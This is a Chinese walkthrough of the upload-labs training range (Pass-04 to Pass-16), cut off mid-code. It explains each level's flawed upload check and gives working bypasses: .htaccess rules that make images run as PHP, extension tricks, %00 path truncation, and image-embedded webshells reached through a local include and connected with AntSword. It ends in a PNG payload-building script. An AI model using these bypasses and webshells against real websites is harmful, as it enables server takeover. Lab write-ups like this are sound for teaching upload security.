+<h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><p>.htaccess payload示例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 方法1：对于jpg文件，按照php文件解析</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line"></span><br><span class="line"># 方法2：对于jpg、png、gif文件，按照php文件解析</span><br><span class="line">&lt;FilesMatch &quot;\.(jpg|png|gif)$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line"># 方法3：对于命名为shell的文件，按照php文件解析</span><br><span class="line">&lt;Files &quot;shell&quot;&gt;</span><br><span class="line">    ForceType application/x-httpd-php</span><br><span class="line">&lt;/Files&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传构造的.htaccess</p>
+<p><img src="/uploads-labs/image-20251108153703007.png" alt="image-20251108153703007"></p>
+<p>上传pass.jpg</p>
+<p><img src="/uploads-labs/image-20251108153715206.png" alt="image-20251108153715206"></p>
+<p>查看文件发现被成功解析</p>
+<p><img src="/uploads-labs/image-20251108153756814.png" alt="image-20251108153756814"></p>
+<h2 id="Pass-05-黑名单绕过，大小写绕过"><a href="#Pass-05-黑名单绕过，大小写绕过" class="headerlink" title="Pass-05 (黑名单绕过，大小写绕过)"></a>Pass-05 (黑名单绕过，大小写绕过)</h2><blockquote>
+<p>服务器端验证-检查后缀-黑名单</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<p><img src="/uploads-labs/image-20251109223851218.png" alt="image-20251109223851218"></p>
+<p>没有使用strtolower()函数，可以使用大小写绕过黑名单</p>
+<p><img src="/uploads-labs/image-20251109224031899.png" alt="image-20251109224031899"></p>
+<p><img src="/uploads-labs/image-20251109224128478.png" alt="image-20251109224128478"></p>
+<h2 id="Pass-06（黑名单验证，空格绕过）"><a href="#Pass-06（黑名单验证，空格绕过）" class="headerlink" title="Pass-06（黑名单验证，空格绕过）"></a>Pass-06（黑名单验证，空格绕过）</h2><blockquote>
+<p>服务器端验证-检查后缀-黑名单</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<p><img src="/uploads-labs/image-20251109224332826.png" alt="image-20251109224332826"></p>
+<p>没有使用trim()去除空格，可以使用空格绕过黑名单</p>
+<p><img src="/uploads-labs/image-20251109224903852.png" alt="image-20251109224903852"></p>
+<p><img src="/uploads-labs/image-20251109224942365.png" alt="image-20251109224942365"></p>
+<p><img src="/uploads-labs/image-20251109230153532.png" alt="image-20251109230153532"></p>
+<h2 id="Pass-07-黑名单验证，点号绕过）"><a href="#Pass-07-黑名单验证，点号绕过）" class="headerlink" title="Pass-07 (黑名单验证，点号绕过）"></a>Pass-07 (黑名单验证，点号绕过）</h2><blockquote>
+<p>服务器端验证-检查后缀-黑名单</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<p><img src="/uploads-labs/image-20251109230424729.png" alt="image-20251109230424729"></p>
+<p>这没有使用deldot()过滤文件名末尾的点，可以使用文件名后加.进行绕过</p>
+<p><img src="/uploads-labs/image-20251109230537474.png" alt="image-20251109230537474"></p>
+<p><img src="/uploads-labs/image-20251109230604260.png" alt="image-20251109230604260"></p>
+<p><img src="/uploads-labs/image-20251109230623789.png" alt="image-20251109230623789"></p>
+<h2 id="Pass-08（黑名单，特殊字符-DATA绕过）"><a href="#Pass-08（黑名单，特殊字符-DATA绕过）" class="headerlink" title="Pass-08（黑名单，特殊字符::$DATA绕过）"></a>Pass-08（黑名单，特殊字符::$DATA绕过）</h2><blockquote>
+<p>服务器端验证-检查后缀-黑名单</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<p><img src="/uploads-labs/image-20251109230756652.png" alt="image-20251109230756652"></p>
+<p>没有<code>str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);</code>去除字符串::$DATA</p>
+<blockquote>
+<p>因为检测后缀时<code>php::$DATA</code>不在黑名单内，但是上传到服务器的文件在Windows中会自动去掉<code>::$DATA</code>变成php文件</p>
+</blockquote>
+<p><img src="/uploads-labs/image-20251109231141450.png" alt="image-20251109231141450"></p>
+<p><img src="/uploads-labs/image-20251109231206777.png" alt="image-20251109231206777"></p>
+<p><img src="/uploads-labs/image-20251109231228359.png" alt="image-20251109231228359"></p>
+<h2 id="Pass-09（黑名单-点-空格-点）"><a href="#Pass-09（黑名单-点-空格-点）" class="headerlink" title="Pass-09（黑名单 点 空格 点）"></a>Pass-09（黑名单 <strong>点 空格 点</strong>）</h2><blockquote>
+<p>服务器端验证-检查后缀-黑名单</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<p><img src="/uploads-labs/image-20251109231604527.png" alt="image-20251109231604527"></p>
+<blockquote>
+<p>deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来</p>
+</blockquote>
+<p><img src="/uploads-labs/image-20251109231751763.png" alt="image-20251109231751763"></p>
+<p><img src="/uploads-labs/image-20251109231810868.png" alt="image-20251109231810868"></p>
+<p><img src="/uploads-labs/image-20251109231829764.png" alt="image-20251109231829764"></p>
+<h2 id="Pass-10（双写绕过）"><a href="#Pass-10（双写绕过）" class="headerlink" title="Pass-10（双写绕过）"></a>Pass-10（双写绕过）</h2><blockquote>
+<p>服务器端验证-检查后缀-黑名单</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<p><img src="/uploads-labs/image-20251111130244385.png" alt="image-20251111130244385"></p>
+<p>因为采用了简单粗暴的将文件非法后缀删掉的方式所以可以尝试双写绕过</p>
+<p><img src="/uploads-labs/image-20251111130800128.png" alt="image-20251111130800128"></p>
+<h2 id="Pass-11-白名单绕过-00截断GET型"><a href="#Pass-11-白名单绕过-00截断GET型" class="headerlink" title="Pass-11 (白名单绕过 00截断GET型)"></a>Pass-11 (白名单绕过 00截断GET型)</h2><blockquote>
+<p>服务器端验证-检查后缀-白名单</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<p><img src="/uploads-labs/image-20251111132048059.png" alt="image-20251111132048059"></p>
+<p>可以看到使用了move_uploaded_file，而且文件保存路径可以用save_path参数进行编辑，所以考虑用00截断进行攻击</p>
+<blockquote>
+<p>php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。</p>
+</blockquote>
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><ol>
+<li><code>php版本&lt;5.3.4</code>:PHP 5.3.4开始，内核层面遇到NULL字节会抛出警告并终止操作</li>
+<li>&#96;&#96;magic_quotes_gpc<code>关闭:当</code>magic_quotes_gpc &#x3D; On&#96;时，PHP会自动对GET、POST、COOKIE数据中的特殊字符（包括NULL字节）进行转义</li>
+</ol>
+<p><img src="/uploads-labs/image-20251111132559285.png" alt="image-20251111132559285"></p>
+<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><p>这里的save_path可以被编辑，可以通过00截断编辑文件保存路径从而修改文件后缀</p>
+<p><img src="/uploads-labs/image-20251111131721560.png" alt="image-20251111131721560"></p>
+<p>上传pass.jpg</p>
+<p><img src="/uploads-labs/image-20251111132857113.png" alt="image-20251111132857113"></p>
+<p>bp抓包修改保存路径</p>
+<p><img src="/uploads-labs/image-20251111132940591.png" alt="image-20251111132940591"></p>
+<p>上传成功</p>
+<p><img src="/uploads-labs/image-20251111133017350.png" alt="image-20251111133017350"></p>
+<h2 id="Pass-12-白名单绕过，post-00截断"><a href="#Pass-12-白名单绕过，post-00截断" class="headerlink" title="Pass-12 (白名单绕过，post 00截断)"></a>Pass-12 (白名单绕过，post 00截断)</h2><blockquote>
+<p>服务器端验证-检查后缀-白名单</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<p><img src="/uploads-labs/image-20251111133200011.png" alt="image-20251111133200011"></p>
+<p>与Pass_11相同只不过save_path转义到post请求体里面了</p>
+<p>上传pass.jpg</p>
+<p><img src="/uploads-labs/image-20251111133303877.png" alt="image-20251111133303877"></p>
+<p>bp抓包改保存路径</p>
+<p><img src="/uploads-labs/image-20251111133906755.png" alt="image-20251111133906755"></p>
+<p><img src="/uploads-labs/image-20251111133930753.png" alt="image-20251111133930753"></p>
+<p>上传成功</p>
+<p><img src="/uploads-labs/image-20251111133950834.png" alt="image-20251111133950834"></p>
+<h2 id="Pass-13-首次制作图片马"><a href="#Pass-13-首次制作图片马" class="headerlink" title="Pass-13(首次制作图片马)"></a>Pass-13(首次制作图片马)</h2><blockquote>
+<p>服务器端验证-检查内容-只读取内容</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<p><img src="/uploads-labs/image-20251111135314944.png" alt="image-20251111135314944"></p>
+<p>只检查文件头判别图片类型，可以通过图片马攻击</p>
+<p><img src="/uploads-labs/image-20251111213528289.png" alt="image-20251111213528289"></p>
+<p><img src="/uploads-labs/image-20251111135859510.png" alt="image-20251111135859510"></p>
+<p>注意单纯的图片马并不能直接和蚁剑连接，因为该文件依然是以image格式进行解析，只有利用其他php文件对图片马进行php解析时才能执行，比如靶场中的以下文件：</p>
+<p><img src="/uploads-labs/image-20251111211824259.png" alt="image-20251111211824259"></p>
+<p>故构造url <code>http://localhost/include.php?file=./upload/6520251111213538.png</code>,蚁剑测试成功</p>
+<p><img src="/uploads-labs/image-20251111213608256.png" alt="image-20251111213608256"></p>
+<h2 id="Pass-14（getimagesize）"><a href="#Pass-14（getimagesize）" class="headerlink" title="Pass-14（getimagesize）"></a>Pass-14（getimagesize）</h2><blockquote>
+<p>服务器端验证-检查内容-只读取内容</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>); <span class="comment">#读取文件头的几个字符串</span></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]); <span class="comment">#将图片类型常量转换为文件扩展名</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样可以利用Pass-13的图片马进行攻击</p>
+<p><img src="/uploads-labs/image-20251111214513415.png" alt="image-20251111214513415"></p>
+<p>构造url <code>http://localhost/include.php?file=./upload/8920251111214510.png</code>,蚁剑测试成功</p>
+<p><img src="/uploads-labs/image-20251111214557875.png" alt="image-20251111214557875"></p>
+<h2 id="Pass-15-exif-imagetype"><a href="#Pass-15-exif-imagetype" class="headerlink" title="Pass-15(exif_imagetype)"></a>Pass-15(exif_imagetype)</h2><blockquote>
+<p>服务器端验证-检查内容-只读取内容</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>); <span class="comment">#读取一个图像的第一个字节并检查其后缀名。需要在phpstudy的扩展种开启php.exif选项</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>做法和上一关同，不再赘述！</p>
+<p><img src="/uploads-labs/image-20251111214751730.png" alt="image-20251111214751730"></p>
+<p><img src="/uploads-labs/image-20251111214810866.png" alt="image-20251111214810866"></p>
+<h2 id="Pass-16（二次渲染）卡住"><a href="#Pass-16（二次渲染）卡住" class="headerlink" title="Pass-16（二次渲染）卡住"></a>Pass-16（二次渲染）卡住</h2><blockquote>
+<p>服务器端验证-检查内容-重新渲染</p>
+</blockquote>
+<p>源代码上传逻辑</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        。。。<span class="comment">#逻辑相同</span></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        。。。<span class="comment">#逻辑相同</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为存在二次渲染，所以要比较原图和渲染后的图片观察哪些区域未被渲染</p>
+<p>关于如何制作应对二次渲染的图片马，参考<a target="_blank" rel="noopener" href="https://sxksec.cn/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/#%E4%BA%94%E3%80%81%E7%BB%95%E8%BF%87%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E5%B9%B6%E5%8C%85%E5%90%ABpng%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC">https://sxksec.cn/2025/01/24/web-an-quan/wen-jian-shang-chuan-lou-dong-zhi-er-ci-xuan-ran-rao-guo/#%E4%BA%94%E3%80%81%E7%BB%95%E8%BF%87%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E5%B9%B6%E5%8C%85%E5%90%ABpng%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC</a></p>
+<h3 id="gif：在不变的数据块中插入一句话木马"><a href="#gif：在不变的数据块中插入一句话木马" class="headerlink" title="gif：在不变的数据块中插入一句话木马"></a>gif：在不变的数据块中插入一句话木马</h3><p><img src="/uploads-labs/image-20251112141024607.png" alt="image-20251112141024607"></p>
+<p><img src="/uploads-labs/image-20251112162202541.png" alt="image-20251112162202541"></p>
+<p>上传成功</p>
+<p><img src="/uploads-labs/image-20251112141125910.png" alt="image-20251112141125910"></p>
+<p>故构造url <code>http://localhost/include.php?file=./upload/26904.gif</code>,蚁剑测试成功&#96;</p>
+<p><a target="_blank" rel="noopener" href="http://localhost/upload/26904.gif">http://localhost/upload/26904.gif</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/* cX&lt;?PHP 不可取消 但可以替换为c&lt;?=</span></span><br><span class="line"><span class="comment">   ?&gt;X&lt;0x00&gt;&lt;0x00&gt; 不可删除。*/</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;cX&lt;?PHP FILE_PUT_CONTENTS();?&gt;X&#x27;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%00&#x27;</span>).<span class="title function_ invoke__">urldecode</span>(<span class="string">&#x27;%00&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload_ascii</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$payload_ascii</span>.=<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload_hex</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">gzinflate</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$payload_ascii</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $payload_hex.&quot;\n&quot;;</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-z0-9]&#123;2&#125;/&#x27;</span>, <span class="variable">$payload_hex</span>, <span class="variable">$matches</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$blist</span>=[];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$matches</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$blist</span>[<span class="variable">$key</span>]=<span class="title function_ invoke__">base_convert</span>(<span class="variable">$value</span>, <span class="number">16</span>, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter1</span>(<span class="params"><span class="variable">$blist</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;(<span class="title function_ invoke__">count</span>(<span class="variable">$blist</span>)-<span class="number">3</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$blist</span>[<span class="variable">$i</span>+<span class="number">3</span>] = (<span class="variable">$blist</span>[<span class="variable">$i</span>+<span 